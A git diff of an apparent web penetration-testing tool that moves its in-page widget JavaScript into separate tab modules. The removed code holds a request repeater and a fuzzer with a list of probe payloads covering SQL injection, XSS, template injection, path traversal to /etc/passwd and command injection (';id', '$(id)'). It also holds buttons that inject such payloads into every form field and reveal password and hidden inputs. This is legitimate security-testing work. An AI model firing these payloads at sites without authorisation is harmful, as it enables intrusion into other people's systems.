@@ -5,6 +5,18 @@ import hashlib
 import urllib.parse
 import datetime
 
+from core.ui_tabs.vulnerabilities_tab import VULNERABILITIES_TAB_JS
+from core.ui_tabs.traffic_tab import TRAFFIC_TAB_JS
+from core.ui_tabs.forms_tab import FORMS_TAB_JS
+from core.ui_tabs.storage_tab import STORAGE_TAB_JS
+from core.ui_tabs.map_tab import MAP_TAB_JS
+from core.ui_tabs.payloads_tab import PAYLOADS_TAB_JS
+from core.ui_tabs.dom_tab import DOM_TAB_JS
+from core.ui_tabs.scope_tab import SCOPE_TAB_JS
+from core.ui_tabs.vpn_tab import VPN_TAB_JS
+from core.ui_tabs.report_tab import REPORT_TAB_JS
+
+
 try:
     from seleniumwire import webdriver
     _SELENIUM_WIRE_AVAILABLE = True
@@ -119,7 +131,7 @@ DOM_SINK_HOOK_JS = r"""
 """
 
 
-WIDGET_INIT_JS = r"""
+WIDGET_INIT_JS_PART_1 = r"""
 (function() {
     try {
         var w = document.getElementById('vulcanx-widget');
@@ -470,1626 +482,9 @@ WIDGET_INIT_JS = r"""
             if (!container) return;
             var tab = window.__vulcanx_state.activeTab;
 
-            if (tab === 'vulnerabilities') {
-                container.innerHTML = '';
-                var findings = window.__vulcanx_state.findings || [];
-                
-                var topRow = document.createElement('div');
-                topRow.style.display = 'flex';
-                topRow.style.justifyContent = 'flex-end';
-                topRow.style.marginBottom = '10px';
-                
-                var clearBtn = document.createElement('button');
-                clearBtn.innerText = '🗑️ Clear Findings';
-                clearBtn.style.background = '#aa0000';
-                clearBtn.style.color = '#fff';
-                clearBtn.style.border = '1px solid #ff0055';
-                clearBtn.style.padding = '5px 10px';
-                clearBtn.style.borderRadius = '3px';
-                clearBtn.style.cursor = 'pointer';
-                clearBtn.onclick = async function() {
-                    if(confirm('Are you sure you want to clear all findings?')) {
-                        try { await fetch('/api/clear_findings', {method: 'POST'}); } catch(e) {}
-                        window.__vulcanx_state.findings = [];
-                        window.__vulcanx_render();
-                    }
-                };
-                topRow.appendChild(clearBtn);
-                container.appendChild(topRow);
+            """
 
-                if (findings.length === 0) {
-                    var emptyDiv = document.createElement('div');
-                    emptyDiv.style.color = '#666';
-                    emptyDiv.style.textAlign = 'center';
-                    emptyDiv.style.marginTop = '50px';
-                    emptyDiv.innerText = 'No vulnerabilities detected yet.';
-                    container.appendChild(emptyDiv);
-                    return;
-                }
-
-                // Group by type
-                var groups = {};
-                findings.forEach(f => {
-                    var type = f.type || 'UNKNOWN';
-                    if (!groups[type]) groups[type] = [];
-                    groups[type].push(f);
-                });
-
-                Object.keys(groups).forEach(type => {
-                    var list = groups[type];
-                    var first = list[0];
-                    var severity = first.severity || 'INFO';
-                    var badgeClass = 'vx-badge vx-badge-' + severity.toLowerCase();
-                    
-                    var details = document.createElement('details');
-                    details.style.marginBottom = '10px';
-                    details.style.borderBottom = '1px solid #222';
-                    details.style.paddingBottom = '8px';
-
-                    if (window.__vx_open_details && window.__vx_open_details[type]) {
-                        details.open = true;
-                    }
-                    details.addEventListener('toggle', function() {
-                        window.__vx_open_details = window.__vx_open_details || {};
-                        window.__vx_open_details[type] = details.open;
-                    });
-
-                    var summary = document.createElement('summary');
-                    summary.style.cursor = 'pointer';
-                    summary.style.fontWeight = 'bold';
-                    summary.style.outline = 'none';
-                    summary.innerHTML = `<span class="${badgeClass}">${severity}</span> <span style="margin-left:5px;">${type}</span> <span style="color:#666;font-size:10px;">(${list.length})</span>`;
-                    details.appendChild(summary);
-
-                    var descDiv = document.createElement('div');
-                    descDiv.className = 'vx-finding-details';
-                    
-                    var remediation = first.remediation || 'Review and secure this resource.';
-                    var description = first.description || 'Vulnerability detected.';
-                    descDiv.innerHTML = `<div style="color:#ffcc00;margin-bottom:6px;">💡 ${description}</div>
-                                         <div style="color:#aaa;margin-bottom:10px;font-style:italic;">Remediation: ${remediation}</div>`;
-
-                    list.forEach(f => {
-                        var item = document.createElement('div');
-                        item.style.marginBottom = '6px';
-                        var method = f.method || '';
-                        var status = f.status_code || '';
-                        var meta = (method || status) ? `[${method} ${status}] ` : '';
-                        var match = f.match || '';
-                        if (match.length > 100) match = match.substring(0, 100) + '...';
-                        item.innerHTML = `<strong style="color:#ff0055;font-size:10px;">${meta}</strong><span style="color:#4da6ff;word-break:break-all;">${f.url}</span><br>
-                                          <span style="color:#888;">Match: <code style="color:#ccc;">${match}</code></span>`;
-                        descDiv.appendChild(item);
-                    });
-
-                    details.appendChild(descDiv);
-                    container.appendChild(details);
-                })            } else if (tab === 'traffic') {
-                container.innerHTML = '';
-                var traffic = window.__vulcanx_state.traffic || [];
-                
-                var topRow = document.createElement('div');
-                topRow.style.display = 'flex';
-                topRow.style.justifyContent = 'flex-end';
-                topRow.style.marginBottom = '10px';
-                
-                var clearBtn = document.createElement('button');
-                clearBtn.innerText = '🗑️ Clear History';
-                clearBtn.style.background = '#aa0000';
-                clearBtn.style.color = '#fff';
-                clearBtn.style.border = '1px solid #ff0055';
-                clearBtn.style.padding = '5px 10px';
-                clearBtn.style.borderRadius = '3px';
-                clearBtn.style.cursor = 'pointer';
-                clearBtn.onclick = async function() {
-                    if(confirm('Are you sure you want to clear all traffic history?')) {
-                        try { await fetch('/api/clear_traffic', {method: 'POST'}); } catch(e) {}
-                        window.__vulcanx_state.traffic = [];
-                        window.__vulcanx_render();
-                    }
-                };
-                topRow.appendChild(clearBtn);
-                container.appendChild(topRow);
-
-                // Add Repeater Section at the top
-                var repeaterDiv = document.createElement('div');
-                repeaterDiv.id = 'vx-repeater';
-                repeaterDiv.style.display = 'none';
-                repeaterDiv.style.marginBottom = '15px';
-                repeaterDiv.style.padding = '10px';
-                repeaterDiv.style.background = '#1a1a24';
-                repeaterDiv.style.border = '1px solid #ff0055';
-                repeaterDiv.style.borderRadius = '5px';
-                
-                var repeaterHeader = document.createElement('div');
-                repeaterHeader.style.display = 'flex';
-                repeaterHeader.style.justifyContent = 'space-between';
-                repeaterHeader.style.marginBottom = '8px';
-                repeaterHeader.innerHTML = '<strong style="color:#ff0055;">Repeater</strong> <button id="vx-close-repeater" style="background:none;border:none;color:#fff;cursor:pointer;">X</button>';
-                repeaterDiv.appendChild(repeaterHeader);
-                
-                var repeaterMethodUrl = document.createElement('div');
-                repeaterMethodUrl.style.display = 'flex';
-                repeaterMethodUrl.style.marginBottom = '8px';
-                
-                var methodSelect = document.createElement('select');
-                ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'].forEach(m => {
-                    var opt = document.createElement('option');
-                    opt.value = m;
-                    opt.innerText = m;
-                    methodSelect.appendChild(opt);
-                });
-                methodSelect.style.background = '#222';
-                methodSelect.style.color = '#fff';
-                methodSelect.style.border = '1px solid #444';
-                methodSelect.style.marginRight = '4px';
-                methodSelect.id = 'vx-rep-method';
-                
-                var urlInput = document.createElement('input');
-                urlInput.type = 'text';
-                urlInput.id = 'vx-rep-url';
-                urlInput.style.flex = '1';
-                urlInput.style.background = '#222';
-                urlInput.style.color = '#fff';
-                urlInput.style.border = '1px solid #444';
-                
-                repeaterMethodUrl.appendChild(methodSelect);
-                repeaterMethodUrl.appendChild(urlInput);
-                repeaterDiv.appendChild(repeaterMethodUrl);
-                
-                var headersLabel = document.createElement('div');
-                headersLabel.innerText = 'Headers (JSON):';
-                headersLabel.style.fontSize = '10px';
-                headersLabel.style.color = '#aaa';
-                repeaterDiv.appendChild(headersLabel);
-                
-                var headersInput = document.createElement('textarea');
-                headersInput.id = 'vx-rep-headers';
-                headersInput.style.width = '100%';
-                headersInput.style.height = '60px';
-                headersInput.style.background = '#222';
-                headersInput.style.color = '#fff';
-                headersInput.style.border = '1px solid #444';
-                headersInput.style.marginBottom = '8px';
-                headersInput.style.fontFamily = 'monospace';
-                headersInput.style.fontSize = '10px';
-                repeaterDiv.appendChild(headersInput);
-                
-                var bodyLabel = document.createElement('div');
-                bodyLabel.innerText = 'Body:';
-                bodyLabel.style.fontSize = '10px';
-                bodyLabel.style.color = '#aaa';
-                repeaterDiv.appendChild(bodyLabel);
-                
-                var bodyInput = document.createElement('textarea');
-                bodyInput.id = 'vx-rep-body';
-                bodyInput.style.width = '100%';
-                bodyInput.style.height = '60px';
-                bodyInput.style.background = '#222';
-                bodyInput.style.color = '#fff';
-                bodyInput.style.border = '1px solid #444';
-                bodyInput.style.marginBottom = '8px';
-                bodyInput.style.fontFamily = 'monospace';
-                bodyInput.style.fontSize = '10px';
-                repeaterDiv.appendChild(bodyInput);
-                
-                var btnGroup = document.createElement('div');
-                btnGroup.style.display = 'flex';
-                btnGroup.style.gap = '10px';
-                btnGroup.style.marginBottom = '8px';
-
-                var sendBtn = document.createElement('button');
-                sendBtn.innerText = 'Send Request';
-                sendBtn.style.background = '#004488';
-                sendBtn.style.color = '#fff';
-                sendBtn.style.border = '1px solid #0088ff';
-                sendBtn.style.padding = '4px 8px';
-                sendBtn.style.borderRadius = '3px';
-                sendBtn.style.cursor = 'pointer';
-                btnGroup.appendChild(sendBtn);
-                
-                var fuzzBtn = document.createElement('button');
-                fuzzBtn.innerText = 'Fuzz Selection (Intruder)';
-                fuzzBtn.style.background = '#660000';
-                fuzzBtn.style.color = '#fff';
-                fuzzBtn.style.border = '1px solid #ff0055';
-                fuzzBtn.style.padding = '4px 8px';
-                fuzzBtn.style.borderRadius = '3px';
-                fuzzBtn.style.cursor = 'pointer';
-                fuzzBtn.title = "Highlight a piece of text in the URL or Body to inject payloads.";
-                btnGroup.appendChild(fuzzBtn);
-
-                repeaterDiv.appendChild(btnGroup);
-
-                var fuzzerStatus = document.createElement('div');
-                fuzzerStatus.id = 'vx-fuzzer-status';
-                fuzzerStatus.style.display = 'none';
-                fuzzerStatus.style.marginBottom = '8px';
-                fuzzerStatus.style.fontSize = '10px';
-                fuzzerStatus.style.color = '#ffcc00';
-                repeaterDiv.appendChild(fuzzerStatus);
-                
-                var respDiv = document.createElement('div');
-                respDiv.id = 'vx-rep-response';
-                respDiv.style.display = 'none';
-                respDiv.style.borderTop = '1px solid #444';
-                respDiv.style.paddingTop = '8px';
-                
-                var respStatus = document.createElement('div');
-                respStatus.id = 'vx-rep-status';
-                respStatus.style.fontWeight = 'bold';
-                respStatus.style.marginBottom = '4px';
-                respDiv.appendChild(respStatus);
-                
-                var respBody = document.createElement('textarea');
-                respBody.id = 'vx-rep-respbody';
-                respBody.style.width = '100%';
-                respBody.style.height = '100px';
-                respBody.style.background = '#111';
-                respBody.style.color = '#00ff55';
-                respBody.style.border = '1px solid #333';
-                respBody.style.fontFamily = 'monospace';
-                respBody.style.fontSize = '10px';
-                respBody.readOnly = true;
-                respDiv.appendChild(respBody);
-                
-                repeaterDiv.appendChild(respDiv);
-                container.appendChild(repeaterDiv);
-                
-                // Repeater logic
-                document.addEventListener('click', function(e) {
-                    if (e.target && e.target.id === 'vx-close-repeater') {
-                        document.getElementById('vx-repeater').style.display = 'none';
-                    }
-                });
-                
-                sendBtn.onclick = async function() {
-                    sendBtn.innerText = 'Sending...';
-                    sendBtn.disabled = true;
-                    respDiv.style.display = 'none';
-                    
-                    var method = methodSelect.value;
-                    var url = urlInput.value;
-                    var body = bodyInput.value;
-                    var headersStr = headersInput.value;
-                    var headers = {};
-                    try {
-                        headers = JSON.parse(headersStr);
-                    } catch(e) {}
-                    
-                    var opts = { method: method, headers: headers, credentials: 'omit' };
-                    if (method !== 'GET' && method !== 'HEAD' && body) {
-                        opts.body = body;
-                    }
-                    
-                    try {
-                        var res = await fetch(url, opts);
-                        var text = await res.text();
-                        respStatus.innerText = 'HTTP ' + res.status;
-                        respStatus.style.color = res.ok ? '#00ff55' : '#ff0055';
-                        respBody.value = text;
-                        respDiv.style.display = 'block';
-                    } catch(err) {
-                        respStatus.innerText = 'Error: ' + err.message;
-                        respStatus.style.color = '#ff0055';
-                        respBody.value = '';
-                        respDiv.style.display = 'block';
-                    }
-                    sendBtn.innerText = 'Send Request';
-                    sendBtn.disabled = false;
-                };
-
-                fuzzBtn.onclick = async function() {
-                    // Try to get selected text from URL or Body
-                    var activeEl = document.activeElement;
-                    var isUrl = activeEl && activeEl.id === 'vx-rep-url';
-                    var isBody = activeEl && activeEl.id === 'vx-rep-body';
-                    
-                    if (!isUrl && !isBody) {
-                        alert("Please click inside the URL or Body field and highlight the text you want to fuzz (e.g. highlight '1' in id=1).");
-                        return;
-                    }
-
-                    var selectionStart = activeEl.selectionStart;
-                    var selectionEnd = activeEl.selectionEnd;
-                    
-                    if (selectionStart === selectionEnd) {
-                        alert("Please highlight/select the specific text you want to replace with payloads.");
-                        return;
-                    }
-
-                    var originalText = activeEl.value;
-                    var prefix = originalText.substring(0, selectionStart);
-                    var suffix = originalText.substring(selectionEnd);
-                    var targetString = originalText.substring(selectionStart, selectionEnd);
-
-                    if (!confirm("Start Fuzzer? We will inject payloads into the highlighted parameter: '" + targetString + "'")) {
-                        return;
-                    }
-
-                    fuzzBtn.disabled = true;
-                    fuzzBtn.style.opacity = '0.5';
-                    fuzzerStatus.style.display = 'block';
-                    respDiv.style.display = 'none';
-
-                    var payloads = [
-                        "'", "''", "`", "``", ",", "\"", "\"\"", "/", "//", "\\", "\\\\", ";", "' or \"", "-- or #", 
-                        "' OR '1", "' OR 1 -- -", "\" OR \"\" = \"", "\" OR 1 = 1 -- -", "' OR '' = '",
-                        "admin' --", "admin' #", "' OR 'x'='x",
-                        "<script>alert(1)</script>", "\"><script>alert(1)</script>", "<img src=x onerror=alert(1)>",
-                        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "[[5*5]]",
-                        "../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini",
-                        ";id", "|id", "`id`", "$(id)"
-                    ];
-
-                    var method = methodSelect.value;
-                    var headersStr = headersInput.value;
-                    var headers = {};
-                    try { headers = JSON.parse(headersStr); } catch(e) {}
-
-                    var url = urlInput.value;
-                    var body = bodyInput.value;
-
-                    var hits = 0;
-                    var errors = 0;
-
-                    for (let i = 0; i < payloads.length; i++) {
-                        var p = payloads[i];
-                        fuzzerStatus.innerText = `Fuzzing: ${i+1}/${payloads.length} [Payload: ${p}]`;
-                        
-                        var f_url = url;
-                        var f_body = body;
-
-                        if (isUrl) f_url = prefix + encodeURIComponent(p) + suffix;
-                        if (isBody) f_body = prefix + p + suffix;
-
-                        var opts = { method: method, headers: headers, credentials: 'omit' };
-                        if (method !== 'GET' && method !== 'HEAD' && f_body) {
-                            opts.body = f_body;
-                        }
-
-                        try {
-                            var res = await fetch(f_url, opts);
-                            var text = await res.text();
-                            
-                            // Check for simple reflection or errors
-                            var interesting = false;
-                            if (res.status >= 500) interesting = true;
-                            if (text.includes("syntax error") || text.includes("mysql") || text.includes("Warning:") || text.includes("Exception")) interesting = true;
-                            if (p === "<script>alert(1)</script>" && text.includes(p)) interesting = true;
-                            if (p === "{{7*7}}" && text.includes("49")) interesting = true;
-                            
-                            if (interesting) {
-                                hits++;
-                                // Log to traffic so user can review it
-                                window.__vulcanx_state.traffic.unshift({
-                                    id: Math.random().toString(),
-                                    method: method,
-                                    url: f_url,
-                                    display_url: f_url.length > 150 ? f_url.substring(0,150) + "..." : f_url,
-                                    status_code: res.status,
-                                    time: new Date().toTimeString().split(' ')[0],
-                                    req_headers: headers,
-                                    req_body: f_body
-                                });
-                            }
-                        } catch(e) {
-                            errors++;
-                        }
-                    }
-
-                    fuzzerStatus.innerText = `Fuzzing Complete! ${hits} interesting responses found. Check Traffic tab. (Errors: ${errors})`;
-                    fuzzBtn.disabled = false;
-                    fuzzBtn.style.opacity = '1';
-                    
-                    if (hits > 0) {
-                        window.__vulcanx_render();
-                        alert(`Fuzzer finished. Found ${hits} potentially vulnerable responses. They have been added to the top of your Traffic log for review!`);
-                    } else {
-                        setTimeout(() => fuzzerStatus.style.display = 'none', 5000);
-                    }
-                };
-
-                if (traffic.length === 0) {
-                    var emptyMsg = document.createElement('div');
-                    emptyMsg.innerHTML = '<div style="color:#666;text-align:center;margin-top:50px;">No traffic intercepted yet.</div>';
-                    container.appendChild(emptyMsg);
-                    return;
-                }
-
-                var table = document.createElement('table');
-                table.className = 'vx-table';
-                table.innerHTML = `<thead>
-                                    <tr>
-                                        <th style="width:60px;">Time</th>
-                                        <th style="width:40px;">Method</th>
-                                        <th>URL</th>
-                                        <th style="width:45px;">Status</th>
-                                    </tr>
-                                   </thead>`;
-                var tbody = document.createElement('tbody');
-                traffic.forEach((t, i) => {
-                    var tr = document.createElement('tr');
-                    tr.style.cursor = 'pointer';
-                    var stColor = t.status_code >= 400 ? '#ff5500' : (t.status_code >= 300 ? '#ffcc00' : '#00ff55');
-                    tr.innerHTML = `<td>${t.time}</td>
-                                    <td style="font-weight:bold;color:#4da6ff;">${t.method}</td>
-                                    <td style="color:#aaa;word-break:break-all;" title="${t.url}">${t.display_url || t.url}</td>
-                                    <td style="color:${stColor};font-weight:bold;">${t.status_code || 'PENDING'}</td>`;
-                    
-                    tr.onmouseover = () => tr.style.background = '#333';
-                    tr.onmouseout = () => tr.style.background = 'transparent';
-                    
-                    tr.onclick = function() {
-                        document.getElementById('vx-repeater').style.display = 'block';
-                        document.getElementById('vx-rep-method').value = t.method;
-                        document.getElementById('vx-rep-url').value = t.url;
-                        
-                        // Parse headers if they exist
-                        var hStr = '{}';
-                        if (t.req_headers) {
-                            try {
-                                hStr = JSON.stringify(t.req_headers, null, 2);
-                            } catch(e){}
-                        }
-                        document.getElementById('vx-rep-headers').value = hStr;
-                        document.getElementById('vx-rep-body').value = t.req_body || '';
-                        
-                        document.getElementById('vx-rep-response').style.display = 'none';
-                        document.getElementById('vx-repeater').scrollIntoView({ behavior: 'smooth', block: 'start' });
-                    };
-                    
-                    tbody.appendChild(tr);
-                });
-                table.appendChild(tbody);
-                container.appendChild(table);
-
-            } else if (tab === 'forms') {
-                container.innerHTML = '';
-                
-                var hlBtn = document.createElement('button');
-                hlBtn.innerText = window.__vulcanx_state.highlighting ? 'Disable Input Highlight' : 'Enable Input Highlight';
-                hlBtn.style.width = '100%';
-                hlBtn.style.padding = '8px';
-                hlBtn.style.background = window.__vulcanx_state.highlighting ? '#800000' : '#006644';
-                hlBtn.style.color = '#fff';
-                hlBtn.style.border = 'none';
-                hlBtn.style.borderRadius = '4px';
-                hlBtn.style.cursor = 'pointer';
-                hlBtn.style.fontWeight = 'bold';
-                hlBtn.style.marginBottom = '12px';
-                
-                hlBtn.onclick = function() {
-                    window.__vulcanx_state.highlighting = !window.__vulcanx_state.highlighting;
-                    window.__vulcanx_toggle_inputs();
-                    window.__vulcanx_render();
-                };
-                container.appendChild(hlBtn);
-
-                var inputs = Array.from(document.querySelectorAll('input:not([type="hidden"]), textarea'));
-                if (inputs.length === 0) {
-                    var noInput = document.createElement('div');
-                    noInput.style.color = '#666';
-                    noInput.style.textAlign = 'center';
-                    noInput.style.marginTop = '20px';
-                    noInput.innerText = 'No input fields found on the current page.';
-                    container.appendChild(noInput);
-                    return;
-                }
-
-                var fillAllXSS = document.createElement('button');
-                fillAllXSS.innerText = 'Fill All XSS';
-                fillAllXSS.style.width = '30%';
-                fillAllXSS.style.padding = '8px';
-                fillAllXSS.style.background = '#440055';
-                fillAllXSS.style.color = '#fff';
-                fillAllXSS.style.border = '1px solid #ff00ff';
-                fillAllXSS.style.borderRadius = '4px';
-                fillAllXSS.style.cursor = 'pointer';
-                fillAllXSS.style.fontWeight = 'bold';
-                fillAllXSS.style.marginBottom = '12px';
-                fillAllXSS.style.marginRight = '2%';
-                fillAllXSS.onclick = function() {
-                    inputs.forEach(input => {
-                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
-                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
-                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
-                        if (setter) { setter.call(input, '\"><script>alert(document.domain)</script>'); } else { input.value = '\"><script>alert(document.domain)</script>'; }
-                        input.dispatchEvent(new Event('input', { bubbles: true }));
-                        input.dispatchEvent(new Event('change', { bubbles: true }));
-                        input.style.border = '2px solid #ff00ff';
-                    });
-                };
-                container.appendChild(fillAllXSS);
-                
-                var fillAllSQLi = document.createElement('button');
-                fillAllSQLi.innerText = 'Fill All SQLi';
-                fillAllSQLi.style.width = '30%';
-                fillAllSQLi.style.padding = '8px';
-                fillAllSQLi.style.background = '#331100';
-                fillAllSQLi.style.color = '#fff';
-                fillAllSQLi.style.border = '1px solid #ff5500';
-                fillAllSQLi.style.borderRadius = '4px';
-                fillAllSQLi.style.cursor = 'pointer';
-                fillAllSQLi.style.fontWeight = 'bold';
-                fillAllSQLi.style.marginBottom = '12px';
-                fillAllSQLi.style.marginRight = '2%';
-                fillAllSQLi.onclick = function() {
-                    inputs.forEach(input => {
-                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
-                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
-                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
-                        if (setter) { setter.call(input, "admin' --"); } else { input.value = "admin' --"; }
-                        input.dispatchEvent(new Event('input', { bubbles: true }));
-                        input.dispatchEvent(new Event('change', { bubbles: true }));
-                        input.style.border = '2px solid #ff5500';
-                    });
-                };
-                container.appendChild(fillAllSQLi);
-                
-                var tamperDOM = document.createElement('button');
-                tamperDOM.innerText = 'Tamper DOM (Reveal All)';
-                tamperDOM.style.width = '100%';
-                tamperDOM.style.padding = '8px';
-                tamperDOM.style.background = '#004400';
-                tamperDOM.style.color = '#00ff55';
-                tamperDOM.style.border = '1px solid #00ff55';
-                tamperDOM.style.borderRadius = '4px';
-                tamperDOM.style.cursor = 'pointer';
-                tamperDOM.style.fontWeight = 'bold';
-                tamperDOM.style.marginBottom = '12px';
-                tamperDOM.onclick = function() {
-                    // Reveal hidden inputs, convert passwords to text, remove maxlengths and disabled attributes
-                    var modifiedCount = 0;
-                    document.querySelectorAll('input, select, textarea, button').forEach(el => {
-                        if (el.type === 'hidden') {
-                            el.type = 'text';
-                            el.style.border = '2px solid #00ff55';
-                            modifiedCount++;
-                        }
-                        if (el.type === 'password') {
-                            el.type = 'text';
-                            el.style.border = '2px solid #00ff55';
-                            modifiedCount++;
-                        }
-                        if (el.hasAttribute('disabled')) {
-                            el.removeAttribute('disabled');
-                            el.style.border = '2px solid #00ff55';
-                            modifiedCount++;
-                        }
-                        if (el.hasAttribute('readonly')) {
-                            el.removeAttribute('readonly');
-                            el.style.border = '2px solid #00ff55';
-                            modifiedCount++;
-                        }
-                        if (el.hasAttribute('maxlength')) {
-                            el.removeAttribute('maxlength');
-                            el.style.border = '2px solid #00ff55';
-                            modifiedCount++;
-                        }
-                    });
-                    if (modifiedCount > 0) {
-                        alert("DOM Tampering Active! " + modifiedCount + " elements modified (revealed hidden fields, removed disabled/readonly/maxlength attributes).");
-                    } else {
-                        alert("No restricted DOM elements found to tamper with.");
-                    }
-                };
-                container.appendChild(tamperDOM);
-
-                var clearAll = document.createElement('button');
-                clearAll.innerText = 'Clear Forms';
-                clearAll.style.width = '30%';
-                clearAll.style.padding = '8px';
-                clearAll.style.background = '#222';
-                clearAll.style.color = '#fff';
-                clearAll.style.border = '1px solid #444';
-                clearAll.style.borderRadius = '4px';
-                clearAll.style.cursor = 'pointer';
-                clearAll.style.fontWeight = 'bold';
-                clearAll.style.marginBottom = '12px';
-                clearAll.onclick = function() {
-                    inputs.forEach(input => {
-                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
-                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
-                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
-                        if (setter) { setter.call(input, ""); } else { input.value = ""; }
-                        input.dispatchEvent(new Event('input', { bubbles: true }));
-                        input.dispatchEvent(new Event('change', { bubbles: true }));
-                        input.style.border = '';
-                    });
-                };
-                container.appendChild(clearAll);
-
-
-                var table = document.createElement('table');
-                table.className = 'vx-table';
-                table.innerHTML = `<thead>
-                                    <tr>
-                                        <th>Name/ID</th>
-                                        <th>Type</th>
-                                        <th>Actions</th>
-                                    </tr>
-                                   </thead>`;
-                var tbody = document.createElement('tbody');
-                inputs.forEach((input, index) => {
-                    var identifier = input.name || input.id || `Input #${index+1}`;
-                    var type = input.tagName === 'TEXTAREA' ? 'textarea' : (input.type || 'text');
-                    
-                    var tr = document.createElement('tr');
-                    var tdName = document.createElement('td');
-                    tdName.innerText = identifier;
-                    tdName.style.color = '#aaa';
-                    tr.appendChild(tdName);
-
-                    var tdType = document.createElement('td');
-                    tdType.innerText = type;
-                    tr.appendChild(tdType);
-
-                    var tdActions = document.createElement('td');
-                    
-                    var fillXSS = document.createElement('button');
-                    fillXSS.innerText = 'Fill XSS';
-                    fillXSS.style.fontSize = '9px';
-                    fillXSS.style.marginRight = '4px';
-                    fillXSS.style.background = '#440055';
-                    fillXSS.style.border = '1px solid #ff00ff';
-                    fillXSS.style.color = '#fff';
-                    fillXSS.style.borderRadius = '3px';
-                    fillXSS.style.cursor = 'pointer';
-                    fillXSS.onclick = function() {
-                        // Use a native value setter to bypass React's property descriptor overrides
-                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
-                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
-                        
-                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
-                        if (setter) {
-                            setter.call(input, '\"><script>alert(document.domain)</script>');
-                        } else {
-                            input.value = '\"><script>alert(document.domain)</script>';
-                        }
-                        
-                        // Dispatch events so frontend frameworks (React, Angular, Vue) register the change
-                        input.dispatchEvent(new Event('input', { bubbles: true }));
-                        input.dispatchEvent(new Event('change', { bubbles: true }));
-                        
-                        input.focus();
-                        input.style.border = '2px solid #ff00ff';
-                        input.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                    };
-                    tdActions.appendChild(fillXSS);
-
-                    var fillSQL = document.createElement('button');
-                    fillSQL.innerText = 'Fill SQLi';
-                    fillSQL.style.fontSize = '9px';
-                    fillSQL.style.marginRight = '4px';
-                    fillSQL.style.background = '#331100';
-                    fillSQL.style.border = '1px solid #ff5500';
-                    fillSQL.style.color = '#fff';
-                    fillSQL.style.borderRadius = '3px';
-                    fillSQL.style.cursor = 'pointer';
-                    fillSQL.onclick = function() {
-                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
-                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
-                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
-                        if (setter) { setter.call(input, "admin' --"); } else { input.value = "admin' --"; }
-                        input.dispatchEvent(new Event('input', { bubbles: true }));
-                        input.dispatchEvent(new Event('change', { bubbles: true }));
-                        input.focus();
-                        input.style.border = '2px solid #ff5500';
-                        input.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                    };
-                    tdActions.appendChild(fillSQL);
-
-                    var fillSSTI = document.createElement('button');
-                    fillSSTI.innerText = 'Fill SSTI';
-                    fillSSTI.style.fontSize = '9px';
-                    fillSSTI.style.marginRight = '4px';
-                    fillSSTI.style.background = '#002244';
-                    fillSSTI.style.border = '1px solid #0088ff';
-                    fillSSTI.style.color = '#fff';
-                    fillSSTI.style.borderRadius = '3px';
-                    fillSSTI.style.cursor = 'pointer';
-                    fillSSTI.onclick = function() {
-                        var payload = "{{7*7}} ${7*7} <%= 7*7 %>";
-                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
-                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
-                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
-                        if (setter) { setter.call(input, payload); } else { input.value = payload; }
-                        input.dispatchEvent(new Event('input', { bubbles: true }));
-                        input.dispatchEvent(new Event('change', { bubbles: true }));
-                        input.focus();
-                        input.style.border = '2px solid #0088ff';
-                        input.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                    };
-                    tdActions.appendChild(fillSSTI);
-                    
-                    var fillCMDi = document.createElement('button');
-                    fillCMDi.innerText = 'Fill CMDi';
-                    fillCMDi.style.fontSize = '9px';
-                    fillCMDi.style.background = '#113300';
-                    fillCMDi.style.border = '1px solid #22ff00';
-                    fillCMDi.style.color = '#fff';
-                    fillCMDi.style.borderRadius = '3px';
-                    fillCMDi.style.cursor = 'pointer';
-                    fillCMDi.onclick = function() {
-                        var payload = "; id # | whoami";
-                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
-                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
-                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
-                        if (setter) { setter.call(input, payload); } else { input.value = payload; }
-                        input.dispatchEvent(new Event('input', { bubbles: true }));
-                        input.dispatchEvent(new Event('change', { bubbles: true }));
-                        input.focus();
-                        input.style.border = '2px solid #22ff00';
-                        input.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                    };
-                    tdActions.appendChild(fillCMDi);
-
-                    tr.appendChild(tdActions);
-                    tbody.appendChild(tr);
-                });
-                table.appendChild(tbody);
-                container.appendChild(table);
-
